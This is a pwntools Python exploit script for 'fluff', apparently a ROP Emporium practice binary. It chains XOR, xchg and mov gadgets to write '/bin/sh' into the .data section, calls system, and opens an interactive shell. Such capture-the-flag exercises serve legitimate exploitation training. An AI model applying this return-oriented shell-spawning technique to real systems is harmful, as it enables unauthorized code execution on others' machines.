#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='amd64')
context.terminal = ['tmux', 'splitw', '-h'] #GDB splits
exe = './fluff'

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
break *pwnme+80
#break *0x400822
#break *0x400832
#break *0x40082f
#break *0x400840
#break *0x40084e
#break *0x400827
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

io = start()
elf = ELF(exe)
rop = ROP(elf)

data = elf.get_section_by_name('.data').header.sh_addr
system = elf.plt.system
junk = 0xdeadbeef
sh = bytearray(b'/bin/sh\x00')
sh.reverse()


#0x400822: xor r11, r11.. ret
xor_r11_r11 = 0x400822
#0x400832: pop r12.. ret
pop_r12 = 0x400832
#0x40082f: xor r11, r12, pop r12..ret
xor_r11_r12_pop_r12 = 0x40082f
#0x400840: xchg r11, r10..ret
xchg_r11_r10 = 0x400840
#0x40084e: mov qword ptr[r10],r11.. pop r12 .. ret
mov_r10_r11_pop_r12 = 0x40084e
#0x400827: mov edi, .data, ret
mov_edi_data = 0x400827

#Move "/bin/sh" string to beginning of .data section
rop.raw(p64(xor_r11_r11))
rop.raw(p64(junk))
rop.raw(p64(pop_r12))
rop.raw(p64(data))
rop.raw(p64(xor_r11_r12_pop_r12))
rop.raw(p64(int(bytes(sh).hex(),16)))
rop.raw(p64(xchg_r11_r10))
rop.raw(p64(junk))

#R10 now contains address of .data, R12 contains "/bin/sh"
rop.raw(p64(xor_r11_r11))
rop.raw(p64(junk))
rop.raw(p64(xor_r11_r12_pop_r12))
rop.raw(p64(0xdeadbeef))

#"/bin/sh" is written to .data
rop.raw(p64(mov_r10_r11_pop_r12))
rop.raw(p64(junk))
rop.raw(p64(0x0))

#.data is moved to EDI and system is executed
rop.raw(p64(mov_edi_data))
rop.raw(system)


payload = fit({40:rop.chain()})

io.sendline(payload)


# shellcode = asm(shellcraft.sh())
# payload = fit({
#     32: 0xdeadbeef,
#     'iaaa': [1, 2, 'Hello', 3]
# }, length=128)
# io.send(payload)
# flag = io.recv(...)
# log.success(flag)

io.interactive()

